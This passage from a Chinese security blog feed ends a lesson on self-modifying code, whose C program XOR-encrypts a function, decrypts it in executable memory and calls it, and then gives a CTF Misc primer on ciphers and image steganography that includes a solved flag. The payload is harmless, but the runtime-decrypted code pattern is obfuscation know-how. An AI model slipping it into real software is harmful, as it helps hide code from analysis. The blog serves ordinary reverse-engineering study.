<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(naked)</span><br><span class="line"><span class="type">void</span> <span class="title function_">important_fun</span><span class="params">()</span> &#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line"></span><br><span class="line">		mov eax, <span class="number">0x76D7AE40</span></span><br><span class="line">		push <span class="number">0</span></span><br><span class="line">		push <span class="number">0x6E617579</span></span><br><span class="line">		push <span class="number">0x6E617578</span></span><br><span class="line">		mov ebx, esp</span><br><span class="line"></span><br><span class="line">		push <span class="number">0</span></span><br><span class="line">		push ebx</span><br><span class="line">		push ebx</span><br><span class="line">		push <span class="number">0</span></span><br><span class="line">		call eax</span><br><span class="line">		add esp, <span class="number">0x0C</span></span><br><span class="line"></span><br><span class="line">		ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">important_fun2</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello, world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt_fun</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> encryped_code[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>* ptr = (<span class="type">unsigned</span> <span class="type">char</span>*)important_fun;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">		encryped_code[i] = ptr[i] ^ <span class="number">0x11</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, encryped_code[i]);</span><br><span class="line">		<span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n======================================\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, ptr[i]);</span><br><span class="line">		<span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_fun</span><span class="params">(PVOID address)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>* ptr = (<span class="type">unsigned</span> <span class="type">char</span>*)address;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">		ptr[i] = ptr[i] ^ <span class="number">0x11</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, ptr[i]);</span><br><span class="line">		<span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> g_code[] = &#123;</span><br><span class="line"><span class="number">0xF8</span>, <span class="number">0x38</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0xF8</span>, <span class="number">0x93</span>, <span class="number">0x39</span>,</span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0xF8</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x39</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0xF8</span>, <span class="number">0xB4</span>, <span class="number">0x12</span>, <span class="number">0x11</span>,</span><br><span class="line"><span class="number">0x11</span>, <span class="number">0xF8</span>, <span class="number">0xAD</span>, <span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0xF8</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">smc_test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	PVOID codePage = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">4096</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (codePage) &#123;</span><br><span class="line">		ZeroMemory(codePage, <span class="number">4096</span>);</span><br><span class="line">		<span class="built_in">memcpy</span>(codePage, g_code, <span class="keyword">sizeof</span>(g_code));</span><br><span class="line">		decrypt_fun(codePage);</span><br><span class="line"></span><br><span class="line">		__asm &#123;</span><br><span class="line">			call codePage</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;start&quot;</span>, MB_OK);</span><br><span class="line">	important_fun();</span><br><span class="line">	<span class="comment">//encrypt_fun();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//smc_test();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//important_fun2();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中有一个函数encrypt_fun()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt_fun</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> encryped_code[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>* ptr = (<span class="type">unsigned</span> <span class="type">char</span>*)important_fun;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">		encryped_code[i] = ptr[i] ^ <span class="number">0x11</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, encryped_code[i]);</span><br><span class="line">		<span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p> 这一个函数可以对important_fun进行一个加密操作</p>
<p>运行之后</p>
<p><img src="/../images/lesson/smc6.png"></p>
<p>上面为加密后的字节码，下面为加密前的字节码，而函数smc_test()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">smc_test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	PVOID codePage = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">4096</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (codePage) &#123;</span><br><span class="line">		ZeroMemory(codePage, <span class="number">4096</span>);</span><br><span class="line">		<span class="built_in">memcpy</span>(codePage, g_code, <span class="keyword">sizeof</span>(g_code));</span><br><span class="line">		decrypt_fun(codePage);</span><br><span class="line"></span><br><span class="line">		__asm &#123;</span><br><span class="line">			call codePage</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这段函数通过<strong>VirtualAlloc</strong>分配了一段内存，会将加密的这段指令拷贝至内存中，接着利用decrypt_fun函数进行一个解密工作，再通过call指令直接调用这段代码</p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>Re</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF(Misc)初体验</title>
    <url>/CTF-Misc-%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<h1 id="CTF是什么"><a href="#CTF是什么" class="headerlink" title="CTF是什么"></a>CTF是什么</h1><p><u>CTF（Capture The Flag）</u>中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。</p>
<span id="more"></span>

<h1 id="CTF的题目形式"><a href="#CTF的题目形式" class="headerlink" title="CTF的题目形式"></a>CTF的题目形式</h1><ul>
<li><h2 id="MISC（安全杂项）"><a href="#MISC（安全杂项）" class="headerlink" title="MISC（安全杂项）"></a>MISC（安全杂项）</h2></li>
</ul>
<p>全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。</p>
<ul>
<li><h2 id="PPC（编程类）"><a href="#PPC（编程类）" class="headerlink" title="PPC（编程类）"></a><strong>PPC（编程类）</strong></h2></li>
</ul>
<p>全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。这部分主要考察选手的快速编程能力。</p>
<ul>
<li><h2 id="REVERSE（逆向）"><a href="#REVERSE（逆向）" class="headerlink" title="REVERSE（逆向）"></a><strong>REVERSE（逆向）</strong></h2></li>
</ul>
<p>全称reverse。题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。</p>
<ul>
<li><h2 id="CRYPTO（密码学）"><a href="#CRYPTO（密码学）" class="headerlink" title="CRYPTO（密码学）"></a><strong>CRYPTO（密码学）</strong></h2></li>
</ul>
<p>全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。实验吧“角斗场”中，这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。</p>
<ul>
<li><h2 id="WEB（web类）"><a href="#WEB（web类）" class="headerlink" title="WEB（web类）"></a><strong>WEB（web类）</strong></h2></li>
</ul>
<p>WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web日站开始的。</p>
<h1 id="MISC简单示例"><a href="#MISC简单示例" class="headerlink" title="MISC简单示例"></a>MISC简单示例</h1><p>在MISC中，一般会给我们图片或者文件与压缩包，在我做题的过程中，出题者给出了如下一张图片<br><img src="/images/GG_.jpg" alt="GG_"></p>
<p>而题目的描述为”当培根掉到猪圈里会引起怎样的火花？？？拭目以待吧！！！“似乎有点奇怪，而且图片中间还有一些奇怪的字符。此时我们根据描述，可以去分别看看”培根“与”猪圈“是什么。在浏览器搜索可以知道它们分别指的是<strong>培根密码</strong>与<strong>猪圈密码</strong>。</p>
<p><img src="/images/1.jpg" alt="1"><br>我们可以发现图上的字符与我们上图的字符有点像，我们可以试着自己翻译或者去在线翻译，得到一串字符”ababbababbbababbabbababbaaaabbbaab“而这串字符又与培根密码有相似之处</p>
<p><img src="/images/2.jpg" alt="2"><br>此时我们对照翻译就是它的正确明文了（翻译为出来得到”MMXYYD“）。</p>
<h1 id="MISC图片隐写"><a href="#MISC图片隐写" class="headerlink" title="MISC图片隐写"></a>MISC图片隐写</h1><ul>
<li><h2 id="常见图片隐写"><a href="#常见图片隐写" class="headerlink" title="常见图片隐写"></a><strong>常见图片隐写</strong></h2></li>
</ul>
<h3 id="1隐藏在图片属性里"><a href="#1隐藏在图片属性里" class="headerlink" title="1隐藏在图片属性里"></a>1隐藏在图片属性里</h3><p>这种方式图片隐藏的flag我一般可以右键查看文件属性，来查看属性中有无对应的flag当然也有可能是一串经过加密的字符，我们可以通过其特性来找出相应的加密方法（属性里一般也会附带上经纬度，所以尽量不要发原图暴露自己的信息哦）</p>
<h3 id="2将压缩包伪装为图片"><a href="#2将压缩包伪装为图片" class="headerlink" title="2将压缩包伪装为图片"></a>2将压缩包伪装为图片</h3><p>一般来说，这种图片看起来与普通图片别无两样，我们可以通过binwalk查看，或者是采用查看压缩包的形式来查看该图片，而flag可能就藏在该图片的某个文件夹之类。</p>
<h3 id="3藏在图片的字节之中"><a href="#3藏在图片的字节之中" class="headerlink" title="3藏在图片的字节之中"></a>3藏在图片的字节之中</h3><p>这类题我们一般可以将图片放入WinHex或者是010 Editor中来查看而图片常见的文件格式如下表所示</p>
<table>
<thead>
<tr>
<th align="center">文件格式</th>
<th align="center">文件头</th>
<th align="center">文件尾</th>
</tr>
</thead>
<tbody><tr>
<td align="center">JEPG（jpg）</td>
<td align="center">FFD8FF</td>
<td align="center">FF D9</td>
</tr>
<tr>
<td align="center">PNG (png)</td>
<td align="center">89504E47</td>
<td align="center">AE 42 60 82</td>
</tr>
<tr>
<td align="center">GIF (gif)</td>
<td align="center">47494638</td>
<td align="center">00 3B</td>
</tr>
</tbody></table>
<p>在这里我们以下图为例</p>
<p><img src="/images/3.jpg" alt="3"></p>
<p>我们可以先右键查看它的属性<br><img src="/images/4.png" alt="4"></p>
<p>发现并没有相关解题信息，我们再以压缩包形式打开,也没有发现其他文件。此时我们将图片拖入010 Editor中查看它的文件头与文件尾。</p>
<p><img src="/images/5.png" alt="5"></p>
<p><img src="/images/6.png" alt="6"></p>
<p>我们与上述表格对比，发现在文件尾”FF D9”后本该什么也没有，但这里多出一串字符，而字符中的“CCSUCTF{010_3d1t0r_15_4_g00d_t00l}”就是我们要的答案了</p>
<ul>
<li><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a><strong>LSB隐写</strong></h2></li>
</ul>
<p>LSB即为最低有效位（Least Significant Bit，lsb），我们知道，图片中的图像像素一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有6777216种。</p>
<p><img src="/images/7.png" alt="7"></p>
<p>十进制的235表示的是绿色，我们修改了在二进制中的最低位，但是颜色看起来依旧没有变化。我们就可以修改最低位中的信息，实现信息的隐写。</p>
<p><img src="/images/8.jpg" alt="8"></p>
<p>而我们在解题过程中用到一款名为“StegSolve”的工具</p>
<p><img src="/images/9.png" alt="9"></p>
<p>在该软件我们可以通过给red，green，blue的0通道打勾来查看图片隐藏的信息。我们用下图来做示例</p>
<p><img src="/images/10.png" alt="10"></p>
<p>我们将文件导入软件并勾选三色的0通道来找到隐藏信息，最终效果如下</p>
<p><img src="/images/11.png" alt="11"></p>
<p>最终我们找到的本题的flag</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>其实这个博客在上周前就已经搭建好了，一直想写点东西，但奈何事情有点多，这几天将CTF题做了一部分终于斗胆写点东西，如果写的太差，还望大佬见谅</p>
<p>ok收工，看银魂去</p>
<p><img src="/images/11.gif" alt="11"></p>
<p>[1]: <a href="https://zhuanlan.zhihu.com/p/461716971">https://zhuanlan.zhihu.com/p/461716971</a>	“ 网安合天实验室”</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
